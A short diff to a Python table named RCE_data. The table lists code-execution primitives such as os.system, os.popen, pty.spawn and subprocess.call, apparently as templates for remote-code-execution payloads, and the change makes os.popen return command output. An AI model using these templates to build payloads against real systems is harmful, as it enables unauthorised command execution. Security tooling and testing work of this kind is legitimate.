@@ -198,7 +198,7 @@ RCE_data = {
         ["os.execvp(CMD_FILE,CMD_FILE,[UNFOLD_CMD_ARGS])", "os"],
         ["os.execvpe(CMD_FILE,CMD_FILE,[UNFOLD_CMD_ARGS])", "os"],
         ["os.system(COMMAND)", "os"],
-        ["os.popen(COMMAND)", "os"],
+        ["os.popen(COMMAND).read()", "os"],
         ["pty.spawn(COMMAND)", "pty"],
         ["pydoc.pipepager(RANDOMSTRING,COMMAND)", "pydoc"],
         ["subprocess.call(COMMAND)", "subprocess"],
